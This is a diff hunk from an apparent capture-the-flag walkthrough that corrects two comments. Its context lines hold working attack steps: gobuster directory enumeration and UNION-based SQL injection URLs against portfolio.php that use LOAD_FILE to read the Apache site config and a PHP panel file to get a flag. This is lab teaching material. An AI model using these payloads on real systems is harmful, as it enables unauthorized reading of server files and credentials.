@@ -33,9 +33,9 @@ gobuster dir -u http://<IP>:<PORT>/administrat -w <wordlist> -t 10 -e php
 	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%201,NULL,NULL%20FROM%20information_schema.tables--%20-
 	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,1,NULL%20FROM%20information_schema.tables--%20-
 
-	# Utilize SQL injection local file to identify the Docmuent Root of the apache2 web-server:
+	# Utilize SQL injection local file read to identify the Docmuent Root of the apache2 web-server:
 	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL%20FROM%20information_schema.tables--%20-
 
-	# Finally utilize SQL injection local file to read to read /var/www/html/administrat/panel.php file and exfiltrate flag:
+	# Finally utilize SQL injection local file read to read /var/www/html/administrat/panel.php file and exfiltrate flag:
 	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,LOAD_FILE(%27/var/www/html/administrat/panel.php%27),NULL%20FROM%20information_schema.tables--%20-
 
